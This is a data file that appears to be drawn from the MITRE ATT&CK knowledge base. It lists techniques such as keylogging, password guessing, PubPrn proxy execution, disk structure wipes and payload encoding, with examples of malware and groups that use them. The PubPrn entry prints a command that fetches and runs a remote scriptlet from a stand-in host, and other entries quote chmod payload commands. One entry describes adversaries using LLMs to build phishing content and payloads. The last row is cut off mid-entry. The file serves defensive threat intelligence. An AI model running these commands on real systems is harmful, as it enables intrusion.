T1596.003,Digital Certificates,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.  Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Phishing for Information] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services] or [Trusted Relationship]",[],
T1056.001,Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping] efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.  Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:  * Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking] this focuses solely on API functions intended for processing keystroke data. * Reading raw keystroke data from the hardware buffer. * Windows Registry modifications. * Custom drivers. * [Modify System Image] may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. ","['[Magic Hound] malware is capable of keylogging.', ""During [Operation Wocao] threat actors obtained the password for the victim's password manager via a custom keylogger."", '[Derusbi] is capable of logging keystrokes.', '[PowerLess] can use a module to log keystrokes.', '[Peppy] can log keystrokes on compromised hosts.', '[WarzoneRAT] has the capability to install a live and offline keylogger, including through the use of the `GetAsyncKeyState` Windows API. ', '[Duqu] can track key presses with a keylogger module.', '[jRAT] has the capability to log keystrokes from the victim’s machine, both offline and online.', '[Metamorfo] has a command to launch a keylogger and capture keystrokes on the victim’s machine. ', '[ADVSTORESHELL] can perform keylogging.', '[APT39] has used tools for capturing keystrokes.', '[MoonWind] has a keylogger.', '[EvilGrab] has the capability to capture keystrokes.', '[XAgentOSX] contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.', '[Empire] includes keylogging capabilities for Windows, Linux, and macOS systems.', '[Micropsia] has keylogging capabilities.', '[Prikormka] contains a keylogger module that collects keystrokes and the titles of foreground windows.', '[APT38] used a Trojan called KEYLIME to capture keystrokes from the victim’s machine.', '[Fysbis] can perform keylogging. ', '[PowerSploit] <code>Get-Keystrokes</code> Exfiltration module can log keystrokes.', '[Revenge RAT] has a plugin for keylogging.', '[Matryoshka] is capable of keylogging.', '[Ajax Security Team] has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.', '[FlawedAmmyy] can collect keyboard events.', '[RTM] can record keystrokes from both the keyboard and virtual keyboard.', '[Cadelspy] has the ability to log keystrokes on the compromised host.', '[Dtrack] dropper contains a keylogging executable.', '[Imminent Monitor] has a keylogging module.', '[Catchamas] collects keystrokes from the victim’s machine.', '[Cobalt Strike] can track key presses with a keylogger module.', '[NetTraveler] contains a keylogger.', '[APT28] has used tools to perform keylogging.', '[QuasarRAT] has a built-in keylogger.', '[Remsec] contains a keylogger component.', '[OwaAuth] captures and DES-encrypts credentials before writing the username and password to a log file, <code>C:\\log.txt</code>.', '[Bandook] contains keylogging capabilities.', '[ROKRAT] can use  `SetWindowsHookEx` and `GetKeyNameText` to capture keystrokes.', '[Darkhotel] has used a keylogger.', '[Regin] contains a keylogger.', '[PlugX] has a module for capturing keystrokes per process including window titles.', '[SLOTHFULMEDIA] has a keylogging capability.', '[BabyShark] has a [PowerShell] remote administration ability that can implement a PowerShell or C# based keylogger.', '[VERMIN] collects keystrokes from the victim machine.', 'When it first starts, [BADNEWS] spawns a new thread to log keystrokes.', '[PoisonIvy] contains a keylogger.', '[MarkiRAT] can capture all keystrokes on a compromised host.', '[ThiefQuest] uses the <code>CGEventTap</code> functions to perform keylogging.', '[Cardinal RAT] can log keystrokes.', '[Remexi] gathers and exfiltrates keystrokes from the machine.', '[InvisiMole] can capture keystrokes on a compromised host.', '[DOGCALL] is capable of logging keystrokes.', '[RunningRAT] captures keystrokes and sends them back to the C2 server.', '[Explosive] has leveraged its keylogging capabilities to gain access to administrator accounts on target servers. ', '[menuPass] has used key loggers to steal usernames and passwords.', '[AppleSeed] can use <code>GetKeyState</code> and <code>GetKeyboardState</code> to capture keystrokes on the victim’s machine.', '[Crimson] can use a module to perform keylogging on compromised hosts.', '[DustySky] contains a keylogger.', '[PoshC2] has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.', '[PcShare] has the ability to capture keystrokes.', '[APT5] has used malware with keylogging capabilities to monitor the communications of targeted entities.', '[Tonto Team] has used keylogging tools in their operations.', '[BadPatch] has a keylogging capability.', '[Lokibot] has the ability to capture input on the compromised host via keylogging.', '[Cuba] logs keystrokes via polling by using <code>GetKeyState</code> and <code>VkKeyScan</code> functions.', '[RCSession] has the ability to capture keystrokes on a compromised host.', '[KeyBoy] installs a keylogger for intercepting credentials and keystrokes.', ""[Mispadu] can log keystrokes on the victim's machine."", 'The executable version of [Helminth] has a module to log keystrokes.', '[Threat Group-3390] actors installed a credential logger on Microsoft Exchange servers. [Threat Group-3390] also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.', '[CosmicDuke] uses a keylogger.', ""[Astaroth] logs keystrokes from the victim's machine. "", '[SMOKEDHAM] can continuously capture keystrokes.', '[Trojan.Karagany] can capture keystrokes on a compromised host.', '[JPIN] contains a custom keylogger.', '[Sykipot] contains keylogging functionality to steal passwords.', '[DarkGate] will spawn a thread on execution to capture all keyboard events and write them to a predefined log file.', 'The [FunnyDream] Keyrecord component can capture keystrokes.', '[DarkTortilla] can download a keylogging module.', '[Kivars] has the ability to initiate keylogging on the infected host.', '[Lazarus Group] malware KiloAlfa contains keylogging functionality.', ""[Grandoreiro] can log keystrokes on the victim's machine."", '[Pupy] uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.', '[Carbanak] logs key strokes for configured processes and sends them back to the C2 server.', 'Malware used by [Group5] is capable of capturing keystrokes.', '[Cobian RAT] has a feature to perform keylogging on the victim’s machine.', '[Agent Tesla] can log keystrokes on the victim’s machine.', '[PLATINUM] has used several different keyloggers.', '[FIN4] has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.', '[SslMM] creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.', '[CHOPSTICK] is capable of performing keylogging.', '[NightClub] can use a plugin for keylogging.', '[Sandworm Team] has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.\t', '[Clambling] can capture keystrokes on a compromised host.', '[NavRAT] logs the keystrokes on the targeted system.', '[njRAT] is capable of logging keystrokes.', '[NanoCore] can perform keylogging on the victim’s machine.', '[Proton] uses a keylogger to capture keystrokes.', '[Machete] logs keystrokes from the victim’s machine.', '[Kimsuky] has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.', '[OilRig] has used keylogging tools called KEYPUNCH and LONGWATCH.\t ', 'One of [Attor] plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.', '[HTTPBrowser] is capable of capturing keystrokes on victims.', '[Sowbug] has used keylogging tools.', '[yty] uses a keylogger plugin to gather keystrokes.', '[MacMa] can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords.', '[BlackEnergy] has run a keylogger plug-in on a victim.', '[ECCENTRICBANDWAGON] can capture and store keystrokes.', '[gh0st RAT] has a keylogger.', '[FakeM] contains a keylogger module.', '[NETWIRE] can perform keylogging.', '[Remcos] has a command for keylogging.', '[QakBot] can capture keystrokes on a compromised host.', '[GreyEnergy] has a module to harvest pressed keystrokes.', '[HEXANE] has used a PowerShell-based keylogger named `kl.ps1`.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] gathered account credentials via a [BlackEnergy] keylogger plugin. ', '[Daserf] can log keystrokes.', '[TinyZBot] contains keylogger functionality.', '[Okrum] was seen using a keylogger tool to capture keystrokes. ', '[DarkComet] has a keylogging capability.', '[APT32] has abused the PasswordChangeNotify to monitor for and capture account password changes.', 'During [Cutting Edge] threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.', '[DarkWatchman] can track key presses with a keylogger module.', '[Zeus Panda] can perform keylogging on the victim’s machine by hooking the functions TranslateMessage and WM_KEYDOWN.', '[BISCUIT] can capture keystrokes.', '[metaMain] has the ability to log keyboard events.', '[Kasidet] has the ability to initiate keylogging.', '[MacSpy] captures keystrokes.', '[SILENTTRINITY] has a keylogging capability.', '[KONNI] has the capability to perform keylogging.', '[KGH_SPY] can perform keylogging by polling the <code>GetAsyncKeyState()</code> function.', '[Unknown Logger] is capable of recording keystrokes.', '[APT3] has used a keylogging tool that records keystrokes in encrypted files.', '[TajMahal] has the ability to capture keystrokes on an infected host.', '[FIN13] has logged the keystrokes of victims to escalate privileges.', ""[ZxShell] has a feature to capture a remote computer's keystrokes using a keylogger. "", '[Ke3chang] has used keyloggers.', '[Rover] has keylogging functionality.', '[APT41] used a keylogger called GEARSHIFT on a target system.', '[AsyncRAT] can capture keystrokes on the victim’s machine.', '[PoetRAT] has used a Python tool named klog.exe for keylogging.', '[Stolen Pencil] has a tool to log keystrokes to %userprofile%\\appdata\\roaming\\apach.{txt,log}. ', ""[Operation Wocao] has obtained the password for the victim's password manager via a custom keylogger."", '[Cobalt Strike] can track key presses with a keylogger module.']",False
T1564.012,File/Path Exclusions,"Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.  Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools] adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery] and other [Discovery] activities to both discover and verify existing exclusions in a victim environment.",[],False
T1222.002,Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).  Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).  Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification] or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow] ","['[TeamTNT] has modified the permissions on binaries with <code>chattr</code>.', '[OSX_OCEANLOTUS.D] has changed permissions of a second-stage payload to an executable via <code>chmod</code>.', '[P.A.S. Webshell] has the ability to modify file permissions.', '[Kinsing] has used chmod to modify permissions on key files for use.', '[OSX/Shlayer] can use the <code>chmod</code> utility to set a file as executable, such as <code>chmod 777</code> or <code>chmod +x</code>.', '[COATHANGER] will set the GID of `httpsd` to 90 when infected.', 'The [Black Basta] binary can use `chmod` to gain full permissions to targeted files.', '[Dok] gives all users execute permissions for the application using the command <code>chmod +x /Users/Shared/AppStore.app</code>.', '[XCSSET] uses the <code>chmod +x</code> command to grant executable permissions to the malicious file.', '[Rocke] has changed file permissions of files so they could not be modified.\t', '[APT32] macOS backdoor changes the permission of the file it wants to execute to 755.', '[Penquin] can add the executable flag to a downloaded file.', '[Bundlore] changes the permissions of a payload using the command <code>chmod -R 755</code>.']",False
T1110.001,Password Guessing,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.  Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.   Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:  * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) * SNMP (161/UDP and 162/TCP/UDP)  In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.  In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.","['[China Chopper] server component can perform brute force password guessing against authentication portals.', '[Emotet] has been observed using a hard coded list of passwords to brute force user accounts. ', '[SpeakUp] can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels. ', '[APT28] has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. [APT28] has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.', '[CrackMapExec] can brute force passwords for a specified user on a single target system or across an entire network.', '[HermeticWizard] can use a list of hardcoded credentials in attempt to authenticate to SMB shares.', '[APT29] has successfully conducted password guessing attacks against a list of mailboxes.', '[Lucifer] has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.', '[Pony] has used a small dictionary of common passwords against a collected list of local accounts.\t', '[Xbash] can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.', '[P.A.S. Webshell] can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.']",False
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic] script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell] via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.  Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.  In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).","['[APT32] has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.']",False
T1597.002,Purchase Technical Data,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.  Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services] or [Valid Accounts]",['[LAPSUS$] has purchased credentials and session tokens from criminal underground forums.'],
T1561.002,Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources.   Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe] may be performed in isolation, or along with [Disk Content Wipe] if all sectors of a disk are wiped.  On a network devices, adversaries may reformat the file system using [Network Device CLI] commands such as `format`.  To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts] [OS Credential Dumping] and [SMB/Windows Admin Shares]","['[Shamoon] has been seen overwriting features of disk structure such as the MBR.', '[HermeticWiper] has the ability to corrupt disk partitions, damage the Master Boot Record (MBR), and overwrite the Master File Table (MFT) of all available physical drives.', '[RawDisk] was used in [Shamoon] to help overwrite components of disk structure like the MBR and disk partitions.', '[WhisperGate] can overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader.', '[APT38] has used a custom MBR wiper named BOOTWRECK to render systems inoperable.', ""[Sandworm Team] has used the [BlackEnergy] KillDisk component to corrupt the infected system's master boot record."", ""[Lazarus Group] malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009."", '[KillDisk] overwrites the first sector of the Master Boot Record with “0x00”.', '[StoneDrill] can wipe the master boot record of an infected computer.', ""[CaddyWiper] has the ability to destroy information about a physical drive's partitions including the MBR, GPT, and partition entries."", ""[APT37] has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).""]",False
T1498.001,Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood] are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.  Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",[],False
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.   Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.  For example, on Windows if an adversary places a malicious program named ""net.exe"" in `C:\example path`, which by default precedes `C:\Windows\system32\net.exe` in the PATH environment variable, when ""net"" is executed from the command-line the `C:\example path` will be called instead of the system's legitimate executable at `C:\Windows\system32\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter]  Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification] or modifying the `/etc/paths.d` folder contents.","['[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.', '[Empire] contains modules that can discover and exploit path interception opportunities in the PATH environment variable.', '[DarkGate] overrides the <code>%windir%</code> environment variable by setting a Registry key, <code>HKEY_CURRENT_User\\Environment\\windir</code>, to an alternate command to execute a malicious AutoIt script. This allows [DarkGate] to run every time the scheduled task <code>DiskCleanup</code> is executed as this uses the path value <code>%windir%\\system32\\cleanmgr.exe</code> for execution.']",False
T1213.002,Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:  * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources ","['[Akira] has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.', ""[LAPSUS$] has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials."", '[spwebmember] is used to enumerate and dump information from Microsoft SharePoint.', ""[Chimera] has collected documents from the victim's SharePoint."", '[APT28] has collected information from Microsoft SharePoint services within target networks.', 'During [C0027] [Scattered Spider] accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.', '[Ke3chang] used a SharePoint enumeration and data dumping tool known as spwebmember.']",
T1588.007,Artificial Intelligence,"Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting [Reconnaissance] creating basic scripts, assisting social engineering, and even developing payloads.  For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing] for Information] campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities] AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information] malicious scripts and payloads. ",[],False
T1564.008,Email Hiding Rules,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell] cmdlets on Windows systems.  Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing] emails sent from the compromised account.  Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines.   In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).","['[Scattered Spider] creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.', '[FIN4] has created rules in victims\' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked,"" ""phish,"" and “malware"" in a likely attempt to prevent organizations from communicating about their activities.']",False
T1491.002,External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement] may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. [External Defacement] may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise]","['[Sandworm Team] defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.']",
T1027.013,Encrypted/Encoded File,"Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing] [Steganography] and [Embedded Payloads] share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information] at the time of execution/use.  This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.  The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.  For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing] payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution]   Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter] execution.","['[DEADEYE] has encrypted its payload.', '[Torisma] has been Base64 encoded and AES encrypted.', '[OSX_OCEANLOTUS.D] encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.', '[Inception] has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.', 'Most strings in [USBStealer] are encrypted using 3DES and XOR and reversed.', 'Variants of [Emissary] encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the ""srand"" and ""rand"" functions.', '[Kessel] configuration is hardcoded and RC4 encrypted within the binary.', '[Raindrop] encrypted its payload using a simple XOR algorithm with a single-byte key.', '[Rifdoor] has encrypted strings with a single byte XOR algorithm.', '[Dark Caracal] has obfuscated strings in [Bandook] by base64 encoding, and then encrypting them.', '[Elderwood] has encrypted documents and malicious executables.', '[Shark] can use encrypted and encoded files for C2 configuration.', '[Ursnif] has used an XOR-based algorithm to encrypt Tor clients dropped to disk.\t[Ursnif] droppers have also been delivered as password-protected zip files that execute base64 encoded [PowerShell] commands.', '[Darkhotel] has obfuscated code using RC4, XOR, and RSA.', '[Transparent Tribe] has dropped encoded executables on compromised hosts.', 'The [Ninja] payload is XOR encrypted and compressed. [Ninja] has also XORed its configuration data with a constant value of `0xAA` and compressed it with the LZSS algorithm.', '[APT28] encrypted a .dll payload using RTL and a custom encryption algorithm. [APT28] has also obfuscated payloads with base64, XOR, and RC4.', '[HAWKBALL] has encrypted the payload with an XOR-based algorithm.', ""[Skidmap] has encrypted it's main payload using 3DES. "", '[Astaroth] has used an XOR-based algorithm to encrypt payloads twice with different keys.', '[APT18] obfuscates strings in the payload.', '[KEYPLUG] can use a hardcoded one-byte XOR encoded configuration file.', '[Sakula] uses single-byte XOR obfuscation to obfuscate many of its files.', '[Zox] has been encoded with Base64.', 'The [Helminth] config file is encrypted with RC4.', '[SamSam] has been seen using AES or DES to encrypt payloads and payload components.', 'Some resources in [Prikormka] are encrypted with a simple XOR operation or encoded with Base64.', '[NanHaiShu] encodes files in Base64.', '[DarkWatchman] has been delivered as compressed RAR payloads in ZIP files to victims.', '[metaMain] module file has been encrypted via XOR.', '[Leviathan] has obfuscated code using base64 and gzip compression.', '[Bazar] has used XOR, RSA2, and RC4 encrypted files.', '[LoudMiner] has encrypted DMG files.\t', '[Sidewinder] has used base64 encoding and ECDH-P256 encryption for payloads.', '[BLUELIGHT] has a XOR-encoded payload.', '[PipeMon] modules are stored encrypted on disk.', '[Woody RAT] has used Base64 encoded strings and scripts.', '[Molerats] has delivered compressed executables within ZIP files to victims.', '[DCSrv] configuration is encrypted.', '[APT39] has used malware to drop encrypted CAB files.', '[GravityRAT] supports file encryption (AES with the key ""lolomycin2017"").', '[Metamorfo] has encrypted payloads and strings.', '[Lazarus Group] has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for [Native API] function names.', '[APT33] has used base64 to encode payloads.', 'During [Night Dragon] threat actors used a DLL that included an XOR-encoded section.', '[LightNeuron] encrypts its configuration files with AES-256.', '[DanBot] can Base64 encode its payload.', '[FELIXROOT] encrypts strings in the backdoor using a custom XOR algorithm.', 'Some data in [Remsec] is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.', 'The [SocGholish] JavaScript payload has been delivered within a compressed ZIP archive. [SocGholish] has also single or double Base-64 encoded references to its second-stage server URLs.', 'During [Operation Honeybee] the threat actors used Base64 to encode files with a custom key.', '[WindTail] can be delivered as a compressed, encrypted, and encoded payload.', 'The [Grandoreiro] payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.', '[Milan] can encode files containing information about the targeted system.', '[BLINDINGCAN] has obfuscated code using Base64 encoding.', '[KONNI] is heavily obfuscated and includes encrypted configuration files.', '[TINYTYPHON] has used XOR with 0x90 to obfuscate its configuration file.', '[BITTER] has used a RAR SFX dropper to deliver malware.', '[WhisperGate] can Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage.', '[ZxxZ] has been encoded to avoid detection from static analysis tools.', '[PcShare] has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm.', '[DarkGate] drops an encrypted PE file, pe.bin, and decrypts it during installation. [DarkGate] also uses custom base64 encoding schemas in later variations to obfuscate payloads.', '[Reaver] encrypts some of its files with XOR.', '[BOOSTWRITE] has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.', '[Fysbis] has been encrypted using XOR and RC4. ', '[TA505] has password-protected malicious Word documents.', '[Stuxnet] uses encrypted configuration blocks and writes encrypted files to disk.', '[Higaisa] used Base64 encoded compressed payloads.', '[BitPaymer] has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.', '[Kwampirs] downloads additional files that are base64-encoded and encrypted with another cipher.', '[Remexi] obfuscates its configuration data with XOR.', 'APIs and strings in some [TYPEFRAME] variants are RC4 encrypted. 